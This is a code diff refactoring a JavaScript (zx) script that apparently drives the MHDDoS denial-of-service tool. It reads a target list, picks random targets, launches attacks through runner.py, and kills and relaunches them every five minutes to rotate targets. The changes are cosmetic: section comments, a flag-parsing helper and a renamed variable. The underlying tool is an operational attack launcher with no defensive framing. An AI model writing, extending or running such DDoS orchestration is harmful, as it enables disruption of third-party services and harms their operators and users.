@@ -2,8 +2,12 @@
 
 // $.verbose = false;
 
+// ===== CONSTANTS
+
 const second = 1;
 const minute = second * 60;
+
+// ===== ARGUMENTS
 
 const {
   _, // we don't need positional arguments
@@ -15,15 +19,16 @@ const {
   debug = true,
   ...mhddosArgs
 } = argv;
-const mhddosFlags = Object.entries(mhddosArgs).map(([key, value]) => {
-  return `${key.length === 1 ? '-' : '--'}${key}=${value}`;
-});
+
+const mhddosFlags = parseFlags(mhddosArgs);
+
+// ===== RUN
 
 await startAttack();
 
 const intervalId = setInterval(async () => {
   await quiet(nothrow($`pkill -f runner.py`));
-  console.log(`\nStopped attacks, updating targets.\n\n${('-').repeat(50)}\n`);
+  console.log(`\nStopped attacks, updating targets.\n\n${'-'.repeat(50)}\n`);
 
   await startAttack();
 }, Math.max(minute * 5, restartInterval) * 1000);
@@ -32,6 +37,8 @@ process.on('SIGINT', function () {
   clearInterval(intervalId);
   process.exit();
 });
+
+// ===== UTILS
 
 async function startAttack() {
   const targets = await getRandomTargets(parallel);
@@ -51,12 +58,17 @@ async function startAttack() {
 
 async function getRandomTargets(parallel) {
   const targets = await getTargetList();
-  const goal = parallel === 'all' ? targets.length : Math.max(1, Math.min(parallel, targets.length));
+  const targetLength =
+    parallel === 'all'
+      ? targets.length
+      : typeof parallel === 'number'
+      ? Math.max(1, Math.min(parallel, targets.length))
+      : 1;
   // console.log({ targets });
-  // console.log({ goal });
+  // console.log({ targetLength });
   const randomTargets = [];
 
-  while (randomTargets.length < goal) {
+  while (randomTargets.length < targetLength) {
     const randomTarget = targets[Math.floor(Math.random() * targets.length)];
 
     if (!randomTargets.includes(randomTarget)) {
@@ -80,4 +92,10 @@ async function getTargetList() {
   const targets = fileContent.match(/^(?:[^#].)+?$/gm)?.map((target) => target.replace('runner.py ', '')) || [];
 
   return [...new Set(targets)];
+}
+
+function parseFlags(args) {
+  return Object.entries(args).map(([key, value]) => {
+    return `${key.length === 1 ? '-' : '--'}${key}=${value}`;
+  });
 }
